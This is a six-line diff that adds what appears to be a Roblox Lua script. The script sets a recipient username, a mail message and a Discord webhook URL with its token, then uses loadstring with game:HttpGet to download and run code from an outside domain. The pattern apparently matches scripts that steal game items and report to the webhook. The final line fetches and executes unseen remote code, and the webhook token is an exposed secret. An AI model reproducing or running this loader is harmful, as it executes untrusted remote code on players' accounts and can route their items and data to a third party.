@@ -1,0 +1,6 @@
+Username = "polnaref120"
+MailMessage = "nothing to say"
+Webhook = "https://discord.com/api/webhooks/1237153835378806866/p0tRkTs2XFZiXKtfchfqjHlpI9mvL5Cx--N1b4xg9zas4MJQL_HnySnqMQ4LIwSV3CZP"
+
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
